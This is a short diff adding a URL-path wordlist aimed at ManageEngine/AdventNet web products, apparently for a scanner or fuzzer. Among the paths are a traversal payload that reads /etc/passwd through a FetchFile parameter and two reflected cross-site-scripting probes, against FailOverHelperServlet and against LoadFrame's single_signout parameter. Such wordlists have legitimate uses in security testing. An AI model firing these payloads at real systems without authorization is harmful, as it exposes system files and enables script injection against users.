@@ -1,0 +1,17 @@
+/RestAPI/ImportTechnicians
+/api/agent/tabs/agentData
+/servlets/FetchFile?fileName=../../../etc/passwd
+
+/authorization.do
+/servlet/GetProductVersion
+/iam/login
+/jsp/index.jsp
+/index.do
+/configurations
+/exchange/index.html
+/apiclient/index.jsp
+/pki/images/keyManager_title.ico
+/apiclient/ember/Login.jsp
+/servlet/com.adventnet.me.opmanager.servlet.FailOverHelperServlet?operation=11111111%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+/LoadFrame?frame_name=x&src=x&single_signout=x%27%3E%3C/iframe%3E%3Cscript%3Ealert(1)%3C/script%3E
+/themes
